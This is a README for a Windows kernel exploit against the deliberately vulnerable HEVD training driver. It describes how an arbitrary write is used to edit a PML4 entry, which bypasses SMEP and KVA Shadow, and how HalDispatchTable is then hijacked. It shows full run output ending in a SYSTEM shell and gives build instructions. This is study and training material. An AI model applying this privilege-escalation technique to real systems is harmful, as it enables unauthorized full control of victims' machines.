# HackSys Extreme Vulnerable Driver (HEVD) - Arbitrary Overwrite Exploit

## Introduction

This repository contains an exploit for [HackSys Extreme Vulnerable Driver (HEVD)](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver) that bypasses [KVA Shadow](https://msrc.microsoft.com/blog/2018/03/kva-shadow-mitigating-meltdown-on-windows/), a mitigation for the Meltdown vulnerability.


## Exploit Overview

The exploit leverages [an Arbitrary Overwrite vulnerability in HEVD](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/b02b6ea/Driver/HEVD/Windows/ArbitraryWrite.c#L112), modifying the PML4 entry to bypass both KVA Shadow and SMEP.

For a detailed explanation and walkthrough of this exploit, see my blog post: [Windows 10 22H2 - HEVDで学ぶKernel Exploit - ommadawn46's blog](https://ommadawn46.hatenablog.com/entry/2024/01/30/101340) (Japanese).
 

## Tested Environment

This exploit was tested in the following environment:

- Windows 10 Version 22H2 (OS Build 19045.3930)
- KVA Shadow: Enabled
- VBS/HVCI: Disabled


### Sample Output

```
C:\Users\debuggee>HEVD_ArbitraryOverwrite.exe
HackSys Extreme Vulnerable Driver (HEVD) - Arbitrary Overwrite Exploit
Windows 10 Version 22H2 (OS Build 19045.3930) with KVA Shadow enabled
-----

[*] Executable shellcode: 000002846A110000
[+] HEVD device handle: 0000000000000098
[+] Kernel base address: FFFFF80560A00000
[+] NtQueryIntervalProfile: 00007FF8C704FA00

[*] Leaking virtual address of shellcode's PML4 entry...
[!] Writing: *(000000BF51BBFC60) = *(FFFFF80560C6B573)
[*] Leaked PTE virtual address: FFFF940000000000
[*] Extracted PML4 Self Reference Entry index: 128
[*] Extracted shellcode's PML4 index: 005
[*] Calculated virtual address for shellcode's PML4 entry: FFFF944A25128028

[*] Modifying shellcode's PML4 entry to bypass SMEP and KVA Shadow...
[!] Writing: *(000000BF51BBFC70) = *(FFFF944A25128028)
[*] Leaked shellcode's PML4 entry: 8A0000015F3D5867
[*] Modified shellcode's PML4 entry: 0A0000015F3D5863
[!] Writing: *(FFFF944A25128028) = *(000000BF51BBFCB8)
[*] Overwrote PML4 entry to make shellcode executable in kernel mode

[*] Modifying HalDispatchTable+0x8 for shellcode execution...
[!] Writing: *(000000BF51BBFC70) = *(FFFFF80561600A68)
[*] Leaked HalDispatchTable+0x8: FFFFF80561392EF0
[!] Writing: *(FFFFF80561600A68) = *(000000BF51BBFCE0)
[*] Overwrote HalDispatchTable+0x8 to gain control flow

[*] Executing shellcode...
[*] Executable SetR13 function allocated at: 000002846A240000
[*] Setting R13 to shellcode's address
[*] Calling NtQueryIntervalProfile to execute shellcode

[*] Restoring the kernel state...
[!] Writing: *(FFFF944A25128028) = *(000000BF51BBFCF8)
[!] Writing: *(FFFFF80561600A68) = *(000000BF51BBFD00)

[+] Spawning a shell with SYSTEM privilege
```

```
Microsoft Windows [Version 10.0.19045.3930]
(c) Microsoft Corporation. All rights reserved.

C:\Users\debuggee>whoami
nt authority\system
```


## Build

To build the exploit, execute the following command in [x64 Native Tools Command Prompt](https://learn.microsoft.com/cpp/build/how-to-enable-a-64-bit-visual-cpp-toolset-on-the-command-line?view=msvc-170):

```
cl.exe HEVD_ArbitraryOverwrite.c
```


## Verifying KVA Shadow Status

To verify if KVA Shadow is active on your system, use [SpecuCheck](https://github.com/ionescu007/SpecuCheck):

```
C:\Users\debuggee>SpecuCheck.exe
SpecuCheck v1.1.1    --   Copyright(c) 2018 Alex Ionescu
https://ionescu007.github.io/SpecuCheck/  --   @aionescu
--------------------------------------------------------

Mitigations for CVE-2017-5754 [rogue data cache load]
--------------------------------------------------------
[-] Kernel VA Shadowing Enabled:                    yes
 ├───> Unnecessary due lack of CPU vulnerability:    no
 ├───> With User Pages Marked Global:                no
 ├───> With PCID Support:                           yes
 └───> With PCID Flushing Optimization (INVPCID):   yes
...
```
